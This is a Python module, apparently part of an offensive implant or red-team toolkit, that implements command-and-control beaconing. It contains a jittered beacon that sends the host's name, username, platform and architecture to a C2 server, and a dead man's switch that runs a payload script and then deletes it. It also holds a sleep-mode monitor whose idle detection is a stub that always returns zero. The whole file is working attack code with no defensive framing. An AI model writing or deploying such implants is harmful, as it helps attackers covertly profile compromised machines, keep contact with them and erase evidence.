# Beaconing Module
import platform
import threading
import time
import json
import random
import socket
import subprocess
from pathlib import Path

class Beacon:
    def __init__(self, c2_host: str, c2_port: int, interval: int = 60):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.interval = interval
        self.jitter = 0.2  # 20% jitter
        self.running = False
        self.thread = None
        self.beacon_count = 0
        self.last_beacon = None
        
    def start(self):
        """Start beaconing"""
        self.running = True
        self.thread = threading.Thread(target=self._beacon_loop, daemon=True)
        self.thread.start()
        
        return {
            "success": True,
            "message": f"Beacon started (interval: {self.interval}s, jitter: {self.jitter*100}%)",
            "c2": f"{self.c2_host}:{self.c2_port}"
        }
    
    def stop(self):
        """Stop beaconing"""
        self.running = False
        if self.thread:
            self.thread.join(timeout=2)
        
        return {"success": True, "message": "Beacon stopped"}
    
    def _beacon_loop(self):
        """Main beacon loop"""
        while self.running:
            try:
                # Calculate next beacon time with jitter
                jitter_amount = random.uniform(-self.jitter, self.jitter)
                sleep_time = self.interval * (1 + jitter_amount)
                
                # Send beacon
                self._send_beacon()
                
                time.sleep(sleep_time)
                
            except Exception as e:
                print(f"Beacon error: {e}")
                time.sleep(self.interval)
    
    def _send_beacon(self):
        """Send beacon to C2"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.c2_host, self.c2_port))
            
            # Gather system info
            info = {
                "beacon": self.beacon_count + 1,
                "hostname": socket.gethostname(),
                "username": self._get_username(),
                "platform": platform.system(),
                "architecture": platform.machine(),
                "timestamp": time.time()
            }
            
            # Send info
            data = json.dumps(info).encode()
            sock.sendall(len(data).to_bytes(4, 'big'))
            sock.sendall(data)
            
            # Wait for response
            try:
                length_data = sock.recv(4)
                if length_data:
                    length = int.from_bytes(length_data, 'big')
                    response = sock.recv(length).decode()
                    # Process response if needed
            except:
                pass
            
            sock.close()
            self.beacon_count += 1
            self.last_beacon = time.time()
            
        except Exception as e:
            print(f"Beacon send error: {e}")
    
    def _get_username(self):
        """Get current username"""
        try:
            import os
            return os.getlogin()
        except:
            return "unknown"
    
    def get_status(self):
        """Get beacon status"""
        return {
            "success": True,
            "running": self.running,
            "beacon_count": self.beacon_count,
            "last_beacon": self.last_beacon,
            "interval": self.interval,
            "c2": f"{self.c2_host}:{self.c2_port}"
        }


class DeadManSwitch:
    def __init__(self, payload_path: str, trigger_on_disconnect: bool = True):
        self.payload_path = payload_path
        self.trigger_on_disconnect = trigger_on_disconnect
        self.connected = False
        self.check_interval = 30
        
    def set_connected(self, connected: bool):
        """Set connection status"""
        self.connected = connected
        
    def check(self):
        """Check if switch should trigger"""
        if self.trigger_on_disconnect and not self.connected:
            return self.trigger()
        return {"success": True, "triggered": False}
    
    def trigger(self):
        """Trigger dead man's switch"""
        try:
            # Execute payload
            subprocess.run(
                ['python3', self.payload_path],
                capture_output=True
            )
            
            # Self-destruct (optional)
            self._self_destruct()
            
            return {"success": True, "triggered": True}
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    def _self_destruct(self):
        """Self-destruct the payload"""
        try:
            import os
            if os.path.exists(self.payload_path):
                os.remove(self.payload_path)
        except:
            pass


class SleepMode:
    def __init__(self, idle_threshold: int = 300):
        self.idle_threshold = idle_threshold  # seconds
        self.running = False
        self.idle_time = 0
        self.thread = None
        
    def start(self):
        """Start sleep mode monitoring"""
        self.running = True
        self.thread = threading.Thread(target=self._monitor_loop, daemon=True)
        self.thread.start()
        
        return {"success": True, "message": f"Sleep mode started (idle threshold: {self.idle_threshold}s)"}
    
    def stop(self):
        """Stop sleep mode"""
        self.running = False
        if self.thread:
            self.thread.join(timeout=2)
        
        return {"success": True, "message": "Sleep mode stopped"}
    
    def _monitor_loop(self):
        """Monitor for idle time"""
        while self.running:
            try:
                idle = self._get_idle_time()
                if idle > self.idle_threshold:
                    self._enter_sleep()
                else:
                    self._wake_up()
            except:
                pass
            
            time.sleep(10)
    
    def _get_idle_time(self):
        """Get system idle time"""
        try:
            if platform.system() == "Linux":
                with open('/proc/dmesg', 'r') as f:
                    # Simplified idle detection
                    return 0
            elif platform.system() == "Windows":
                import ctypes
                # Get idle time from Windows API
                return 0
        except:
            return 0
        
        return 0
    
    def _enter_sleep(self):
        """Enter sleep mode"""
        print("Entering sleep mode...")
    
    def _wake_up(self):
        """Wake up from sleep mode"""
        print("Waking up...")


def start_beacon(c2_host: str, c2_port: int, interval: int = 60):
    """Quick beacon start function"""
    beacon = Beacon(c2_host, c2_port, interval)
    result = beacon.start()
    
    import sys
    sys._rs_beacon = beacon
    
    return result


def get_beacon_status():
    """Quick beacon status function"""
    import sys
    if hasattr(sys, '_rs_beacon'):
        return sys._rs_beacon.get_status()
    return {"success": False, "message": "Beacon not running"}
